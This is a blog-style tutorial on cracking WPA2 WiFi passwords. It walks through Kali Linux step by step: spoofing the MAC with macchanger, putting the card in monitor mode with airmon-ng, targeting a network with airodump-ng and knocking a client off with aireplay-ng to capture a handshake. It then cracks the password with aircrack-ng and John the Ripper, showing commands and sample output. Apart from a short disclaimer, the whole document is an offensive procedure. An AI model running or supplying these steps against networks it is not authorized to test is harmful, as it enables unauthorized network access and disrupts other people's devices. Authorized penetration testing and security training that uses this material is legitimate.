### WiFi Hacking with Aircrack and John The Ripper

Nowadays people assume that as long as they don't use WEP or a really bad password, their WiFi is safe. Many assume that in-order to 'hack' their WiFi someone needs to be there, testing passwords against their router. This is unfortunately not the case. I'm going to show you how easy it is to crack a WPA password and gain access to a network.

# DISCLAIMER: Hacking is generally only legal on devices you own or have full-written consent to do so on. Otherwise doing so is illegal and can lead to JAIL. Be smart with your knowledge!

First stop, [Kali!](https://www.kali.org/) If you don't know how to download and run Kali Linux, then you probably shouldn't be messing around with this. All of the tools we'll use for this are standard in Kali, along with numerous others.

**Tools:**
- Aircrack's suite of tools
- John The Ripper
- ifconfig (optional)
- Macchanger (optional)
- Injection capable WiFi card (optional)

**Step 1: Find out what your WiFi interface (card) is called**
```
home ~ $ ifconfig -a 
wlp12s0   Link encap:Ethernet  HWaddr 00:40:ff:6f:d8:97
          BROADCAST MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
```
We're using ifconfig here. It's a great tool to find out useful information about your network interfaces. Here we see that 'wlp12s0' is the name of our wireless card (wirless interfaces generally start with a 'w', where loopbacks start with 'l' and ethernet start with 'e').

**Step 2: Change your MAC address**
```
home ~ # macchanger -A wlp12s0
Current MAC:   00:40:ff:6f:d8:97 (TELEBIT CORPORATION)
Permanent MAC: 12:34:56:78:90:12 (Intel Corporate)
New MAC:       00:1f:e9:8b:10:50 (Printrex, Inc.)
```
Next we'll use macchanger to change our MAC address (the ID associated with our network card that it will broadcast over the ether) to something random (-A). It's a great tool to know about.

**Step 3: Enable Monitor Mode on your WiFi interface**
```
home ~ # airmon-ng start wlp12s0
Found 5 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

PID    Name
1047    avahi-daemon
1065    NetworkManager
1072    avahi-daemon
1347    wpa_supplicant
1940    dhclient

Interface    Chipset        Driver

wlp12s0        Intel 3945ABG    iwl3945 - [phy0]SIOCSIFFLAGS: Operation not possible due to RF-kill

                (monitor mode enabled on mon0)
```
Here we have airmon actually activate Monitor Mode on our wireless card. Not all card are capable of this, but fortunately ours (and most) is. Airmon also lets us know that there are some programs running which may interfere with monitor mode, so we can kill them if that's the case. Additionally, it tells us that our monitor interface (that it just created) is called 'mon0'. We could also find that out by simply running 'ifconfig' again.

**Step 4: Scan for your target**
```
home ~ # airodump-ng mon0
 CH  4 ][ Elapsed: 48 s ][ 2017-04-13 10:53 ][ paused output                                            
                                                                                                        
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                        
 E0:91:F5:0D:1B:99  -69      196        0    0  11  54 . WPA2 CCMP   PSK  Secure WiFi
```
Using airodump we finally get to see some networks, though I've sanitized this output to just what we're looking for. airodump will scan through every channel, updating information about all the networks it finds and sorting them based on signal strength. We find here our network (identified by it's ESSID "Secure WiFi"), it's BSSID (E0:91:F5:0D:1B:99), and it's channel number (11).

**Step 5: Perform a focused analysis of your target and wait for a handshake. If impatient, go to step 6.**
```
home ~ # airodump-ng --bssid E0:91:F5:0D:1B:99 -c 11 -w secure mon0
 CH 11 ][ Elapsed: 1 min ][ 2017-04-13 11:11 ][ paused output                                        
                                                                                                        
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                        
 E0:91:F5:0D:1B:99  -81  19      308        0    0  11  54 . WPA2 CCMP   PSK  Secure WiFi               
                                                                                                        
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                              
                                                                                                        
 E0:91:F5:0D:1B:99  00:37:6D:54:66:A4  -51    0 -54      0        1
```
Then we stop airdump and restart it with a much-more focused command. We'll only allow it to scan our desired channel, only display information about our desired BSSID, and save all captures to files beginning with 'secure'. Next we wait for a capture.

The goal behind these procedures so-far is to obtain a 'handshake' between a device (re)connecting to the network and the access point (router). This handshake contains the WiFi password in an encrypted form. Instead of simply waiting for a 'natural' handshake to occur (when a device normally connects or reconnects to the network) we can also force one. See step 6 for this. Skip to step 7 if you're patient.

**Step 6: If impatient, deauth a client**
```
home ~ # aireplay-ng -0 1 -a E0:91:F5:0D:1B:99 -c 00:37:6D:54:66:A4 mon0
11:22:40  Waiting for beacon frame (BSSID: E0:91:F5:0D:1B:99) on channel 11
11:22:42  Sending 64 directed DeAuth. STMAC: [00:37:6D:54:66:A4] [ 0| 5 ACKs]
```
If you're impatient you can force a client (device) to re-authenticate (reconnect) with an access point (router). This is done by sending 'deauthenticate'/'deauth' packets to the device using aireplay. Our options here are: '-0 1' to send one (1) deauth, '-a ...' to give the BSSID of the access point, and '-c ...' to give it the MAC of the client. These are all found in our airdump captures. This is not an end-all-be-all solution to forcing a deauth, so be prepared for it to not work after the first attempt, or even at-all with some devices.

**Step 7: Get a handshake!**
```
 CH 11 ][ Elapsed: 1 min ][ 2017-04-13 11:11 ][WPA handshake: E0:91:F5:0D:1B:99]                                      
                                                                                                        
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                        
 E0:91:F5:0D:1B:99  -81  19      308        0    0  11  54 . WPA2 CCMP   PSK  Secure WiFi               
                                                                                                        
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                              
                                                                                                        
 E0:91:F5:0D:1B:99  00:37:6D:54:66:A4  -51    0 -54      0        1
```
Now that you've sat around for a while or forced a deauth, you'll await the little message at the top of airdump (which you left running the whole time, right?) that will indicate a successfull WPA handshake capture.

**Step 8: Go offline. Yup the rest of this attack can be done at-home on your supercomputer.**

**Step 9: Use Aircrack to crack that password.**
```
home ~ # aircrack-ng -w rockyou.txt -b E0:91:F5:0D:1B:99 ./secure-05.cap
Aircrack-ng 1.2 beta3

                   [00:00:28] 32488 keys tested (1168.12 k/s)

                           KEY FOUND! [ zookeeper ]

      Master Key     : FF 8A BE B9 E3 08 17 A7 C0 11 BA 40 8F 46 CC FA
                       E5 7B B9 3D 06 13 34 E3 AB 25 96 5B 37 6F B6 76

      Transient Key  : 33 9F 8A 7E C7 8D 86 24 C0 15 5D 5D 35 2B A0 C5
                       2E 34 30 ED BC EF 61 8C 58 B4 FD A5 7B 25 CB 7F
                       CB 5B 49 C8 34 1F 35 25 58 BA 59 01 EC 0F 01 90
                       23 4B EF 33 A6 08 E0 9A 6E 74 69 65 9E 40 19 87

      EAPOL HMAC     : A3 4F 71 75 5A 9E E2 B2 D5 84 02 07 6D 12 01 1E
```
Aircrack is the final step here. You take your capture file (.cap), combine it with the BSSID of your target access point and a list of passwords (like [rockyou](https://wiki.skullsecurity.org/Passwords)), and TADA! There's your password. Of course this means in order for this to work, the password has to be in your wordlist. If its not, this won't work.

**Step 10: Done! You now have the target WiFi password.**

Alternatively, you can use John The Ripper to feed Aircrack it's passwords. The advantage of John is it's flexability, speed, and options that Aircrack simply doesn't offer.

You can simply feed Aircrack the same list of passwords it would already use:
```
home ~ # john --wordlist=./rockyou.txt --session=cracker --stdout | aircrack-ng -b E0:91:F5:0D:1B:99 ./secure-05.cap -w -
```
You can use John's smart brute-force mode:
```
home ~ # john --incremental --session=cracker --stdout | aircrack-ng -b E0:91:F5:0D:1B:99 ./secure-05.cap -w -
```
You can even resume a cracking session at a later time:
```
home ~ # john --restore=cracker | aircrack-ng -b E0:91:F5:0D:1B:99 ./secure-05.cap -w -
```
I've highlighted here only a few options, but all of these tools can be used in many ways to enhance their performance. Just look at the man pages!

**Happy Hunting,**<br>
**-@Bugg**

I'm not liable for anything you do. If you aren't being smart, that's on you!
